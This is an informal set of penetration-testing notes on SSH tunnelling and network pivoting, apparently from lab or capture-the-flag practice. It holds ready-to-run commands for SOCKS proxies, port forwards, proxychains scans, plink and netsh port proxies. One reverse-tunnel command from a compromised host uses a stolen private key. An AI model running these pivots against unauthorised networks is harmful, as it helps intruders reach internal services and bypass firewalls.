I don't feel like organizing this.

```
ssh -D 1080 user@host

then

nmap -sS 1.2.3.4 --proxy 127.0.0.1:1080



ssh -L1080:localhost:5901 charix@10.10.10.84


-L[localporttolistenon]:localhost:[remoteport] user@ip

Our machine will listen on the first port, and the remote machine will listen on the
second port.

if you do -N you won't issue any commands

remote ssh:
on remote machine do this command, then it exposes the local 3306 out to x.x.x.146
ssh -R 192.168.119.146:2221:127.0.0.1:3306 t3harvinator@192.168.119.146

after that, then 146 can scan port 127.0.0.1:2221 and interact with the 3306


ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@10.11.0.4
In Listing 892, we will open up port 1122 on Kali to point to port 22 on the MariaDB host. Next, we will also open 13306 on Kali to point to 3306 on the MariaDB host



proxychains:
on our machine do
sudo ssh -N -D 127.0.0.1:8080 student@[remoteip]
this logs into other machine as ssh so we need ssh
then edit /etc/proxychains.conf
socks4 127.0.0.1 8080

then can scan through proxychains
sudo proxychains nmap --top-ports=20 -sT -Pn 172.16.146.5


can also do:
 ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa t3harvinator@192.168.119.146



**WINDOWS**
cmd.exe /c echo y | plink.exe -ssh -l kali - pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
this is the same as remote port forward and exposes 3306 to 10.11.0.4.
10.11.0.4 can then scan 1234


can also pivot through netsh
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110

be sure to add firewall rule
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```